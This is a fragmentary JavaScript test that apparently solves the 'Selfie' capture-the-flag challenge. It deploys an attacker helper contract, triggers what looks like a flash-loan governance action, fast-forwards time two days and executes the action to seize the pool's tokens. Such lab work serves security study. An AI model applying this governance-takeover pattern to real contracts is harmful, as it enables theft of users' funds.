...
describe("[Challenge] Selfie", function () {
  ...
  it("Exploit", async function () {
    ...
    const attacker_helper = await SelfieAttackerFactory.deploy(
      attacker.address,
      this.pool.address,
      this.governance.address,
      this.token.address
    ...
    await attacker_helper.execute(TOKENS_IN_POOL);
    const action_id = await attacker_helper.actionId();
    console.log(action_id);

    await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]); // 2 days
    await this.governance.connect(attacker).executeAction(action_id);
  });
